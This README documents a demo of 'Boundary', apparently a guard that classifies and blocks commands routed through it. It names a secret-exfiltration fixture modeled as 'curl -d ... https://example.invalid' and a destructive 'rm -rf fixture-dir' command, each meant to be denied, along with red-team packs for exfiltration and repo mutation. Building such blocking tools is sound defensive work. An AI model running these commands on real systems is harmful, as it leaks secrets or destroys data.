# Command Boundary Demo

`boundary demo command-secret-exfil` is the user-facing Lane 2 demo in
Boundary's two-lane proof spine. It exercises Command Boundary, a delivered
preview routed-only surface, by denying a routed secret-exfiltration command
before execution.

```bash
boundary demo command-secret-exfil
```

Expected success signal:

```text
actual: DENY
executed=false
class=C6
```

The fixture models a routed `curl -d [redacted] https://example.invalid`
secret-exfiltration command. Boundary classifies and evaluates the command,
denies it before execution, and emits a decision record. No real `.env` file is
read, no network call is made, and no live mutation occurs.

## Other Command Boundary Commands

Classify without executing:

```bash
boundary command classify -- git push origin main
```

Run an allowed wrapper-routed command:

```bash
boundary command run -- git status
```

Deny a destructive wrapper-routed command before execution:

```bash
boundary command run -- rm -rf fixture-dir
```

The underlying fixture/evidence path for Lane 2 is the red-team pack:

```bash
boundary redteam --pack command-secret-exfil
boundary redteam --pack command-repo-mutation
```

## What It Proves

- Wrapper-routed commands can be classified.
- Denied or approval-required commands do not execute.
- Project-local shims can route selected commands through Boundary.
- Fixture command redteams can report expected deny or require-approval outcomes
  without live mutation.

## What It Does Not Prove

- Global shell control.
- CI control unless CI routes commands through Boundary.
- SSH control.
- Every command path covered.
- Protection for direct shell access.
- Universal coding-agent safety.

Canonical repository demo:
[docs/command-boundary/DEMO.md](https://github.com/Fulcrum-Governance/Fulcrum-Boundary/blob/main/docs/command-boundary/DEMO.md)
